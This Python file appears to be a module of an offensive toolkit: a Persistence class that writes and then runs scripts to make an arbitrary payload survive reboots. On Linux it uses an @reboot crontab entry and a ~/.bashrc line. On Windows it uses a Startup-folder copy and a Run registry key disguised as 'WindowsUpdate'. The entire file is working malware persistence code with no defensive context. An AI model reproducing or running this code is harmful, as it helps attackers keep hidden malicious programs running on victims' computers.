#!/usr/bin/env python3

import os
import subprocess
from rich.console import Console
from rich.prompt import Prompt

console = Console()

class Persistence:
    def __init__(self):
        self.scripts_dir = "scripts/persistence"
        
    def create_startup_script(self, payload_path, platform="linux"):
        """Create persistence startup script"""
        try:
            if platform == "linux":
                script_content = f"""#!/bin/bash
# Add to crontab
(crontab -l 2>/dev/null; echo "@reboot {payload_path}") | crontab -
# Add to .bashrc
echo "{payload_path}" >> ~/.bashrc
"""
            elif platform == "windows":
                script_content = f"""@echo off
:: Add to startup folder
copy "{payload_path}" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
:: Add to registry
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "{payload_path}" /f
"""
            else:
                console.print("[red]Unsupported platform![/red]")
                return False
                
            if not os.path.exists(self.scripts_dir):
                os.makedirs(self.scripts_dir)
                
            script_path = f"{self.scripts_dir}/persistence_{platform}.{'bat' if platform == 'windows' else 'sh'}"
            
            with open(script_path, "w") as f:
                f.write(script_content)
                
            os.chmod(script_path, 0o755)
            console.print(f"[green]Persistence script created: {script_path}[/green]")
            return True
            
        except Exception as e:
            console.print(f"[red]Error creating persistence script: {str(e)}[/red]")
            return False
            
    def install_persistence(self, payload_path, platform="linux"):
        """Install persistence mechanisms"""
        try:
            if self.create_startup_script(payload_path, platform):
                script_path = f"{self.scripts_dir}/persistence_{platform}.{'bat' if platform == 'windows' else 'sh'}"
                
                if platform == "linux":
                    subprocess.run(["bash", script_path], check=True)
                elif platform == "windows":
                    subprocess.run(["cmd", "/c", script_path], check=True)
                    
                console.print("[green]Persistence mechanisms installed successfully[/green]")
                return True
            return False
            
        except subprocess.CalledProcessError as e:
            console.print(f"[red]Error installing persistence: {str(e)}[/red]")
            return False 